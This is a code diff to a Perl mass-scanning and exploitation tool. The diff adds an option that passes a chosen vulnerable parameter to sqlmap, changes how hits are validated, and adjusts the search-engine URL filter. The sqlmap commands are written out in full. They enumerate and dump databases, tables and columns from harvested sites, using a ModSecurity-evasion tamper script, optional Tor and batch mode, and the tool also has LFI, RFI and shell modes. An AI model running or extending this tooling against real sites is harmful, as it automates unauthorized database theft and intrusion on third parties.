@@ -134,6 +134,7 @@ my $Target;
 my $validation_text;
 my $exploit;
 my $sqlmap;
+my $p;
 my $mlfi;
 my $mjoomrfi;
 my $shell;
@@ -182,6 +183,7 @@ Getopt::Long::GetOptions(\my %OPT,
                         'valid=s' => \$validation_text,
                         'exp=s' => \$exploit,
                         'sqlmap' => \$sqlmap,
+                        'p=s' => \$p,
                         'lfi' => \$mlfi,
                         'joomrfi' => \$mjoomrfi,
                         'shell=s' => \$shell,
@@ -719,6 +721,9 @@ if ((defined $command) || (defined $sqlmap)){
   }
   if (defined $sqlmap){
     print "\033[0;36m/Sqlmap ";
+	if (defined $p){
+      print "\033[0;36m[Vul Param $p] ";
+	}
   }
   print "\n";
 }
@@ -1137,30 +1142,39 @@ sub checkedurl {
     }
   }
   print "\033[1;37m    SCAN:   ";
-  if (($response->is_success) && ($html =~ m/$yes/i) && ($html !~ m/$no/i)){
-    if ($response->previous) {
-	  print "\033[0;31mNo Results Found! \n";
+  if (($html =~ m/$yes/i) && ($html !~ m/$no/i)) {
+    if (defined $validation_text) {
+	  print "\033[0;32m$URL1 \n";
+      open (LOS, '>>', $Bin.'/scan.txt');
+      print LOS "$URL1\n";
+	  close (LOS);
 	}else{
-      if (defined $beep) {print chr(7);}
-	  if (defined $cms) {
-        print "\033[0;32m$cms\n";
-	  }elsif (defined $cmails) {
-        print "\033[0;32m$1\n";
-	  }else{
-        print "\033[0;32m$URL1\n";
+	  if ($response->is_success) {
+        if ($response->previous) {
+	      print "\033[0;31mNo Results Found! \n";
+	    }else{
+          if (defined $beep) {print chr(7);}
+	      if (defined $cms) {
+            print "\033[0;32m$cms\n";
+	      }elsif (defined $cmails) {
+            print "\033[0;32m$1\n";
+	      }else{
+            print "\033[0;32m$URL1\n";
+	      }
+          open (INFO, '>>', $Bin.'/scan.txt');
+	      if (defined $cmails) {
+            print INFO "$1\n";
+	      }else{
+            print INFO "$URL1\n";
+	      }
+          close (INFO);
+	      if (defined $cmails){
+            open (LOG, '>>', $Bin.'/scan2.txt');
+            print LOG "$URL1\n   $1\n";
+		    close (LOG);
+	      }	
+	    }
 	  }
-      open (INFO, '>>', $Bin.'/scan.txt');
-	  if (defined $cmails) {
-        print INFO "$1\n";
-	  }else{
-        print INFO "$URL1\n";
-	  }
-      close (INFO);
-	  if (defined $cmails){
-        open (LOG, '>>', $Bin.'/scan2.txt');
-        print LOG "$URL1\n   $1\n";
-		close (LOG);
-	  }	
 	}
   }else{
 	print "\033[0;31mNo Results Found! \n";
@@ -1375,7 +1389,7 @@ sub msearch {
         $search->as_string;
         my $Res=$search->content;
         while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
-          if($1 !~ /msn|live|bing|cookieSet|exploit4arab|pastebin|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed|adw.sapo|tripadvisor|yandex/){
+          if($1 !~ /msn|live|bing|cookieSet|security|youtube.com|0day|exploit|pastebin|microsoft|WindowsLiveTranslator|google|cache|74.125.153.132|inurl:|q=|404|403|Network|Failed|adw.sapo|tripadvisor|yandex/){
             if (defined $unique) {
 		      $check=$s_results;
 	        }elsif (defined $ifinurl) {
@@ -1385,7 +1399,10 @@ sub msearch {
 		    }
            	if (index($1, $check) != -1) {
 			  my $URL=$1;
-		      $URL=~s/&(.*)/\ /g;
+		      #$URL=~s/&(.*)/\ /g;
+			  use HTML::Entities;
+			  $URL = decode_entities($URL);
+
 			  if ((defined $msites) || (defined $mdom)) {
 			    if (index($URL, 'http://') != -1) {
 	              $URL =~ s/http:\/\///g;
@@ -1606,9 +1623,9 @@ sub mvalidation {
 	print "\033[1;33m]\n";
     print "\033[1;37m    TARGET: ";
     print "\033[0;34m$printarget\n";
-	$URL = control($URL);
+	$URL = control($URL);	
     $yes = $validation_text;
-    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+    $no = 'xxxvf';
     if (defined $exploit) {
       $count3=0;
       open (EXP, $Bin.'/exploits.txt');
@@ -1849,6 +1866,11 @@ sub sqlmap {
 	}else{
 	  $tor = "";
 	}
+	if (defined $p) {
+	  $p = "-p $p";
+	}else{
+	  $p = "";
+	}
 	print "\033[1;35m";
 	timer();
 	print "[$count/";
@@ -1859,7 +1881,7 @@ sub sqlmap {
 	print "\033[1;37m    [+] EXPLOITATION: ";
     print "Sqlmap \n\n";
     print "\033[0;33m[+] Checking databases...\n";
-    system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+    system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		
 	### BEG DATABASE
 	DATABASE:; 
@@ -1876,7 +1898,7 @@ sub sqlmap {
         goto DATABASENAME;
       };
       print "\033[0;33m[+] Checking...";
-      system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
+      system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
 	  ### END DATABASE
 	  ### BEG TABLES
 	  TABLESYES:;
@@ -1893,7 +1915,7 @@ sub sqlmap {
           goto TABLES;
         }
         print "\033[0;33m[+] Checking DataBase Tables...";
-        system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+        system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		### END TABLES
 		### BEG COLUMNS
 		COLUMNSYES:;
@@ -1910,7 +1932,7 @@ sub sqlmap {
             goto COLS;
           }
           print "\033[0;33m[+] Checking Columns...";
-          system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+          system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 	    } ### END COLUMNS
 	  }
 	}
@@ -3566,6 +3588,7 @@ sub help {
   print "   --exp         | Exploit\n";
   print "   -t            | Target \n";
   print "   --sqlmap      | Sqlmaping xss results \n";
+  print "   -p            | Set xss vulnerable parameter to sqlmap \n";
   print "   --xss         | Xss scan \n";
   print "   --lfi         | Local file inclusion \n";
   print "   --joomrfi     | Scan for joomla local file inclusion\n";
